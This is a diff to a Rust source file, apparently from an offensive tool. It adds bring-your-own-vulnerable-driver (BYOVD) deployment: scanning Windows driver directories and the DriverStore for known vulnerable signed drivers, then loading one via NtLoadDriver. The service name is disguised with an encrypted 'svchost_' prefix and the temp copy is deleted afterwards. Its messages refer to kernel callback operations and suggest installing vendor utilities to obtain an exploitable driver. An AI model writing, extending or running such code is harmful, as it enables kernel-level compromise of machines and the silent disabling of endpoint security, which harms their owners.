@@ -257,6 +257,112 @@ fn derive_driver_key(session_key: &[u8]) -> [u8; DRIVER_XOR_KEY_LEN] {
     key
 }
 
+/// Search for a known vulnerable driver in Windows system directories.
+///
+/// Checks (in priority order):
+/// 1. `%SystemRoot%\System32\drivers\<name>`
+/// 2. `%SystemRoot%\SysWOW64\drivers\<name>`
+/// 3. `%SystemRoot%\System32\DriverStore\FileRepository\**\<name>`
+///    (Windows Update / hardware installer drop zone; one level deep)
+///
+/// Returns the first Win32 path where the file is found, or `None`.
+fn find_driver_in_system_paths(driver: &VulnerableDriver) -> Option<String> {
+    use std::path::Path;
+
+    let system_root =
+        std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
+
+    // Fixed system-driver directories.
+    let candidates = [
+        format!("{}\\System32\\drivers\\{}", system_root, driver.name),
+        format!("{}\\SysWOW64\\drivers\\{}", system_root, driver.name),
+    ];
+    for path in &candidates {
+        if Path::new(path).exists() {
+            log::info!("Found {} at {}", driver.name, path);
+            return Some(path.clone());
+        }
+    }
+
+    // DriverStore: one level of sub-directories under FileRepository.
+    let driverstore = format!(
+        "{}\\System32\\DriverStore\\FileRepository",
+        system_root
+    );
+    if let Ok(entries) = std::fs::read_dir(&driverstore) {
+        for entry in entries.flatten() {
+            let candidate = entry.path().join(driver.name);
+            if candidate.exists() {
+                log::info!(
+                    "Found {} in DriverStore at {}",
+                    driver.name,
+                    candidate.display()
+                );
+                return candidate.to_str().map(|s| s.to_string());
+            }
+        }
+    }
+
+    None
+}
+
+/// Deploy a vulnerable driver that is already present at a local filesystem
+/// path (e.g., discovered via DriverStore or system-driver scan).
+///
+/// Unlike `deploy_embedded_driver`, the bytes are **not** XOR-encrypted —
+/// they are read verbatim from `source_path`, copied to a temp location with
+/// an obfuscated service name, loaded via NtLoadDriver, and then the temp
+/// copy is removed.
+fn deploy_from_local_path(
+    driver: &'static VulnerableDriver,
+    source_path: &str,
+) -> Result<DeployedDriver> {
+    // Read the raw driver binary from the on-disk source.
+    let driver_bytes = std::fs::read(source_path)
+        .with_context(|| format!("Failed to read driver binary from {}", source_path))?;
+
+    // Generate an obfuscated service name and temp path.
+    let service_prefix_bytes = string_crypt::enc_str!("svchost_");
+    let service_prefix = String::from_utf8_lossy(&service_prefix_bytes);
+    let service_name = format!(
+        "{}{}",
+        service_prefix.trim_end_matches('\0'),
+        crate::common_short_id()
+    );
+    let temp_path = format!("C:\\Windows\\Temp\\{}.sys", service_name);
+
+    // Write to obfuscated temp path.
+    write_driver_to_disk(&temp_path, &driver_bytes)
+        .context("failed to write DriverStore driver to temp path")?;
+
+    // Load via registry + NtLoadDriver; always clean up temp copy afterward.
+    let result = load_driver_via_registry(driver, &service_name, &temp_path);
+    let _ = delete_file_from_disk(&temp_path);
+    let device_handle = result?;
+
+    let deployed = DeployedDriver {
+        driver,
+        device_handle: Some(device_handle),
+        service_name,
+        was_preloaded: false,
+    };
+
+    {
+        let mut guard = DEPLOYED.lock().unwrap();
+        *guard = Some(deployed);
+    }
+
+    log::info!(
+        "Deployed {} from local path {} (device handle: {:?})",
+        driver.name,
+        source_path,
+        Some(device_handle)
+    );
+
+    let guard = DEPLOYED.lock().unwrap();
+    Ok(guard.as_ref().unwrap().clone())
+}
+
 /// Drop an embedded driver to disk, load it, and clean up.
 ///
 /// Steps:
@@ -1064,9 +1170,53 @@ pub fn deploy(preferred: &[String], session_key: &[u8]) -> Result<DeployedDriver
     }
 
     let embedded = driver_db::embedded_drivers();
-    if !embedded_payload_is_configured() {
+    if embedded.is_empty() {
         bail!(
-            "No vulnerable driver could be deployed: no pre-loaded driver found and embedded payload wiring is not configured (placeholder resource active). Build with --features embedded_driver and set SYS_DRIVER_PATH."
+            "No vulnerable drivers available for this platform. \
+             The driver database is empty (no ARM64-compatible vulnerable \
+             signed drivers are publicly known). BYOVD kernel callback \
+             operations are not supported on this architecture."
+        );
+    }
+    if !embedded_payload_is_configured() {
+        // No embedded payload is configured.  Fall back to scanning Windows
+        // system directories and the DriverStore for any known vulnerable
+        // driver that is already present on this machine (e.g., installed by
+        // a hardware vendor, Windows Update, or previous software install).
+        log::info!(
+            "No embedded driver payload configured; scanning system paths and \
+             DriverStore for known vulnerable drivers."
+        );
+
+        for driver in driver_db::DRIVER_DATABASE {
+            if !preferred.is_empty()
+                && !preferred
+                    .iter()
+                    .any(|p| p.eq_ignore_ascii_case(driver.name))
+            {
+                continue;
+            }
+
+            if let Some(sys_path) = find_driver_in_system_paths(driver) {
+                match deploy_from_local_path(driver, &sys_path) {
+                    Ok(deployed) => return Ok(deployed),
+                    Err(e) => log::warn!(
+                        "DriverStore deploy of {} from {}: {}",
+                        driver.name,
+                        sys_path,
+                        e
+                    ),
+                }
+            }
+        }
+
+        bail!(
+            "No vulnerable driver could be deployed: no pre-loaded driver found, \
+             no embedded payload configured, and no known vulnerable drivers \
+             found in system directories or the Windows DriverStore. \
+             Install a supported driver package (e.g., MSI Afterburner, Dell \
+             BIOS utility) or rebuild with --features embedded_driver and \
+             SYS_DRIVER_PATH set to an XOR-encrypted driver binary."
         );
     }
 
